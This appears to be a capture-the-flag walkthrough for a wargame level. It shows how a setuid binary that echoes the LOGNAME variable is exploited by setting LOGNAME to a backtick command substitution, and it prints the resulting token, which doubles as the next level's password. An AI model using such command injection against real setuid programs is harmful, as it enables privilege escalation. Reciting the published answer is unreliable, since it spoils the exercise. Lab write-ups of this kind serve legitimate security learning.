## Check files in home

ls -la

->  -rwsr-sr-x 1 flag07  level07 8805 Mar  5  2016 level07

## check level07, this files have permissions in flag07 when executed then with string

string level07

```bash
	LOGNAME
	/bin/echo %s 
```

## to exploit then we need to change the value of env LOGNAME "LOGNAME=level07"

```bash
	export LOGNAME=\`getflag\`
```

## finally execute level07 script

./level07

->  Check flag.Here is your token : fiumuikeil55xe9cu4dood66h

## Log in to user level07
su level08 (password: fiumuikeil55xe9cu4dood66h)